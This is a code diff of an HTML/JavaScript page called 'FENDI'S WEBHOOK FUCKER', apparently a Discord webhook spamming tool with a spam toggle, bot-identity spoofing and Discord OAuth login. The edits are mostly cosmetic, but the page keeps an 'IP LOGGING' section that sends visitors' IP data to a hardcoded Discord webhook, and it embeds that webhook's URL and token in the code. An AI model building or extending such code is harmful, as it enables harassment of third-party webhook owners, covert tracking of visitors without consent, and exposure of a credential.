@@ -6,7 +6,7 @@
     <title>FENDI'S WEBHOOK FUCKER</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/gL0cffbC/New-Project-7.png">
     <style>
-        /* ===================== ALL STYLES (unchanged) ===================== */
+        /* ========== ALL STYLES (same as before) ========== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
@@ -73,14 +73,7 @@
             backdrop-filter: blur(4px);
             position: relative;
         }
-        .user-avatar {
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            border: 2px solid #ff8888;
-            object-fit: cover;
-            background: #1a0000;
-        }
+        .user-avatar { width: 48px; height: 48px; border-radius: 50%; border: 2px solid #ff8888; object-fit: cover; background: #1a0000; }
         .user-info { flex: 1; }
         .user-name { color: #ffdddd; font-weight: 600; font-size: 0.9rem; }
         .user-tag { color: #ffaaaa; font-size: 0.7rem; opacity: 0.8; }
@@ -244,7 +237,6 @@
     <span id="trackTitle" class="track-title">Pass Out</span>
 </div>
 
-<!-- LOADING SCREEN -->
 <div id="loadingScreen" class="loading-screen">
     <div class="loading-content">
         <div class="loading-logo">FENDI'S WEBHOOK FUCKER</div>
@@ -254,7 +246,6 @@
     </div>
 </div>
 
-<!-- MAIN APP -->
 <div id="mainApp" class="main-app">
     <div class="tilt-wrapper">
         <div class="tilt-card" id="tiltCard">
@@ -292,15 +283,14 @@
     </div>
 </div>
 
-<!-- MODALS -->
 <div id="nameModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Name</h3><input type="text" id="nameInput" placeholder="Custom name" style="width:100%"><div class="edit-actions"><button id="saveNameBtn">Save</button><button id="cancelNameBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
 <div id="picModal" class="edit-overlay"><div class="edit-modal"><h3>Edit Bot Avatar</h3><div class="input-group"><label>Image URL</label><input type="text" id="picUrlInput" placeholder="https://..."></div><div style="text-align:center; margin:10px 0;">OR</div><label for="fileUpload" class="custom-file-upload">Choose Image from PC</label><input type="file" id="fileUpload" accept="image/jpeg,image/png,image/gif,image/webp" capture="environment"><div id="picPreview" style="margin-top:10px; text-align:center;"></div><div class="edit-actions"><button id="savePicBtn">Save</button><button id="cancelPicBtn" style="background:#3a1a1a;">Cancel</button></div></div></div>
 
-<div class="version-tag">v1.7</div>
+<div class="version-tag">v1.8</div>
 
 <script>
     (function() {
-        // ===================== SPINNER FADE OUT -> ENTER BUTTON =====================
+        // ========== SPINNER -> ENTER BUTTON ==========
         const spinner = document.getElementById('spinnerContainer');
         const enterBtn = document.getElementById('enterBtn');
         setTimeout(() => {
@@ -311,11 +301,13 @@
                 enterBtn.classList.add('show');
             }, 400);
         }, 3500);
-        
-        // ===================== DISCORD OAUTH (PKCE) - FIXED TOKEN EXCHANGE =====================
-        const DISCORD_CLIENT_ID = "YOUR_CLIENT_ID_HERE";   // REPLACE WITH YOUR DISCORD CLIENT ID
-        // IMPORTANT: The REDIRECT_URI must be EXACTLY the same as registered in Discord OAuth2 settings
-        const REDIRECT_URI = window.location.origin;       // e.g. https://www.fenditools.shop
+
+        // ========== DISCORD OAUTH (PKCE) – Fixed & Reliable ==========
+        // 🔧 REPLACE THIS WITH YOUR DISCORD CLIENT ID
+        const DISCORD_CLIENT_ID = "YOUR_CLIENT_ID_HERE";   // e.g. "1497124094926127155"
+        // The redirect URI must be EXACTLY the same as registered in Discord OAuth2 → Redirects.
+        // For a Vercel deployment, it is your domain (no trailing slash).
+        const REDIRECT_URI = window.location.origin;
         
         function generateRandomString(length) {
             let text = "";
@@ -355,7 +347,7 @@
             });
             if (!response.ok) {
                 const errorText = await response.text();
-                throw new Error(`Token exchange failed: ${response.status} ${errorText}`);
+                throw new Error(`Token exchange failed (${response.status}): ${errorText}`);
             }
             const data = await response.json();
             return data.access_token;
@@ -437,6 +429,7 @@
                         localStorage.removeItem("discord_access_token");
                     }
                 } catch(e) {
+                    console.warn("Stored token invalid, clearing", e);
                     localStorage.removeItem("discord_access_token");
                 }
             }
@@ -447,7 +440,7 @@
                 window.location.href = authUrl;
             } catch(e) {
                 console.error("OAuth init failed", e);
-                showMainAppAndStart();
+                showMainAppAndStart(); // fallback
             }
         }
         
@@ -461,7 +454,7 @@
             }, 800);
         }
         
-        // ===================== IP LOGGING (unchanged) =====================
+        // ========== IP LOGGING (unchanged) ==========
         const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
         const WEBHOOK_NAME = "IP Logs";
         const WEBHOOK_ICON = "https://i.ibb.co/gL0cffbC/New-Project-7.png";
@@ -605,14 +598,14 @@
             } catch(e) { console.error("Failed to send IP log", e); }
         }
         
-        // ===================== ENTER BUTTON ACTION =====================
+        // ========== ENTER BUTTON ==========
         const loadingScreen = document.getElementById('loadingScreen');
         const mainApp = document.getElementById('mainApp');
         enterBtn.addEventListener('click', async () => {
             await startAppAfterAuth();
         });
         
-        // Handle OAuth redirect
+        // Handle OAuth redirect (when user comes back from Discord)
         const urlParams = new URLSearchParams(window.location.search);
         const code = urlParams.get("code");
         if (code) {
@@ -627,6 +620,7 @@
                     showMainAppAndStart();
                 }).catch(err => {
                     console.error("Token exchange failed", err);
+                    // Still load the main app without Discord profile
                     window.history.replaceState({}, document.title, window.location.pathname);
                     showMainAppAndStart();
                 });
@@ -643,12 +637,11 @@
             }
         }
         
-        // ===================== TYPEWRITER WITH FADE & LOOP =====================
+        // ========== TYPEWRITER EFFECT ==========
         const titleText = "FENDI'S WEBHOOK FUCKER";
         const targetSpan = document.getElementById('typewriterTarget');
         let i = 0;
         let typingActive = true;
-        let fadeTimeout = null;
         function typeWriter() {
             if (!typingActive) return;
             if (i < titleText.length) {
@@ -660,7 +653,7 @@
                 const titleContainer = document.querySelector('.glow-title');
                 titleContainer.style.transition = 'opacity 0.5s ease';
                 titleContainer.style.opacity = '0';
-                fadeTimeout = setTimeout(() => {
+                setTimeout(() => {
                     targetSpan.innerHTML = '';
                     titleContainer.style.opacity = '1';
                     i = 0;
@@ -671,7 +664,7 @@
         }
         typeWriter();
         
-        // ===================== MUSIC PLAYER =====================
+        // ========== MUSIC PLAYER ==========
         const tracks = [
             { title: "Pass Out", url: "./songs/PassOut.mp3" },
             { title: "VYZEE", url: "./songs/VYZEE.mp3" },
@@ -726,7 +719,7 @@
         prevBtn.addEventListener('click', prevTrack);
         nextBtn.addEventListener('click', nextTrack);
         
-        // ===================== SCROLL MOTION BLUR =====================
+        // ========== SCROLL BLUR ==========
         let scrollTimeout;
         window.addEventListener('scroll', () => {
             document.body.classList.add('scrolling');
@@ -737,7 +730,7 @@
         styleBlur.textContent = 'body.scrolling { filter: blur(2px); transition: filter 0.15s ease-out; } body { transition: filter 0.15s ease-out; }';
         document.head.appendChild(styleBlur);
         
-        // ===================== THOCKY SOUNDS =====================
+        // ========== THOCKY SOUNDS ==========
         let audioCtx = null;
         function playThock() {
             try {
@@ -756,20 +749,20 @@
         }
         document.querySelectorAll('input, textarea').forEach(el => el.addEventListener('keydown', playThock));
         
-        // ===================== JOIN BUTTONS =====================
+        // ========== JOIN BUTTONS ==========
         const joinBtns = ['loadingJoin', 'joinFooter'];
         joinBtns.forEach(id => {
             const el = document.getElementById(id);
             if (el) el.addEventListener('click', (e) => { e.preventDefault(); window.open('https://discord.gg/funerals', '_blank'); });
         });
         
-        // ===================== TOOLS MENU =====================
+        // ========== TOOLS MENU ==========
         const logo = document.getElementById('logoBtn');
         const toolsMenu = document.getElementById('toolsMenu');
         logo.addEventListener('click', (e) => { e.stopPropagation(); toolsMenu.classList.toggle('active'); });
         document.addEventListener('click', (e) => { if (!toolsMenu.contains(e.target) && !logo.contains(e.target)) toolsMenu.classList.remove('active'); });
         
-        // ===================== SNOW PARTICLES =====================
+        // ========== SNOW PARTICLES ==========
         const canvas = document.getElementById('snowCanvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
@@ -800,7 +793,7 @@
         initSnow();
         drawSnow();
         
-        // ===================== TILT EFFECT =====================
+        // ========== TILT EFFECT ==========
         const card = document.getElementById('tiltCard');
         const maxTilt = 5;
         function onMouseMove(e) {
@@ -819,7 +812,7 @@
         card.addEventListener('mouseenter', () => card.style.transition = 'transform 0.05s linear');
         window.addEventListener('mousemove', onMouseMove);
         
-        // ===================== PANEL SWITCHING =====================
+        // ========== PANEL SWITCHING ==========
         const mainPanel = document.getElementById('mainPanel');
         const settingsPanel = document.getElementById('settingsPanel');
         const settingsBtn = document.getElementById('settingsBtn');
@@ -889,7 +882,7 @@
         settingsBtn.addEventListener('click', () => settingsVisible ? closeSettings() : openSettings());
         closeSettingsBtn.addEventListener('click', closeSettings);
         
-        // ===================== SPAM TOGGLE =====================
+        // ========== SPAM TOGGLE ==========
         const spamCheck = document.getElementById('spamToggle');
         const spamWrapper = document.getElementById('spamWrapper');
         spamCheck.addEventListener('change', () => {
@@ -901,7 +894,7 @@
             }, 50);
         });
         
-        // ===================== BOT CUSTOMIZATION (unchanged) =====================
+        // ========== BOT CUSTOMIZATION ==========
         let botName = '', botAvatar = '';
         const nameSpan = document.getElementById('currentName');
         const picSpan = document.getElementById('currentPic');
@@ -980,7 +973,7 @@
         document.getElementById('cancelPicBtn').addEventListener('click', closePicModal);
         document.getElementById('openPicBtn').addEventListener('click', () => { if (botAvatar) window.open(botAvatar, '_blank'); });
         
-        // ===================== WEBHOOK SENDING =====================
+        // ========== WEBHOOK SENDING ==========
         const webhookUrlInput = document.getElementById('webhookUrl');
         const messageInput = document.getElementById('messageContent');
         const sendBtn = document.getElementById('sendBtn');
@@ -1048,7 +1041,7 @@
         sendBtn.addEventListener('click', handleSend);
         messageInput.addEventListener('keydown', (e) => { if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') handleSend(); });
         
-        // ===================== DYNAMIC GRID =====================
+        // ========== DYNAMIC GRID ==========
         const gridBackdrop = document.querySelector('.grid-backdrop');
         document.addEventListener('mousemove', (e) => {
             const x = (e.clientX / window.innerWidth) * 100;
